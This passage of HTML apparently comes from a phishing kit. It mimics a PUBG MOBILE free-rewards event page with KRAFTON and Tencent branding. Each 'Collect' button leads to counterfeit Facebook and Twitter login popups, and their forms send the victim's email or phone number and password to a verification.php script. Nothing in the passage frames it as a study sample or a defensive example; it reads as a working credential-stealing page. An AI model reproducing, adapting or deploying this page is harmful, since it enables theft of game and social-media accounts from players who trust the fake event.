<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/7.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/8.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/9.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/10.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/11.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/12.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/13.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/14.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/14.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/15.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/16.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/17.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/19.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/20.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/21.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/22.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/22.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/23.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/23.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/24.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/25.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/25.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/26.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/27.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/27.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/28.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/29.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/30.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/31.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/31.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/32.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/32.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/33.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/33.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/34.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/34.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/35.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/35.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/36.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/36.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/37.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/37.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/jnLQLD1x/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Thwcks3z/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/bdB94RGs/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/YvcfCqz7/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/w7RQzsJF/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Sxyy8Kzz/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
<div class="footer-txt-copyright">ⓒ <!--?php echo $yearNow;?--> KRAFTON, Inc. All rights reserved.</div>
<div class="footer-txt-copyright">ⓒ 2018-<!--?php echo $yearNow;?--> Tencent. All rights reserved.</div>
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="popup-title">Reward Confirmation</div>
<div class="popup-content">
<br>
<div class="popup-rewards-title">Are you sure to collect this rewards?</div>
<img class="popup-rewards-img1" src="" id="myRewardImg">
</div>
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-deactive" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" class="popup-btn-active" onclick="open_account_login()">Collect</button>
</div>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="popup-title">Account Login</div>
<div class="popup-content">
<br>
<div class="popup-rewards-title">Log in with your PUBG MOBILE account to continue</div>
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
</div>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="verification.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<img src="https://i.ibb.co/W0V2vPK/twitter-text.png">
		</div>
		<br>
		<br>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="form-group">
				<input type="text" name="email" autocomplete="off" required>
				<label>Phone/email/username</label>
				</div>
				<div class="form-group">
				<input type="password" name="password" autocomplete="off" required>
				<label>Password</label>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>
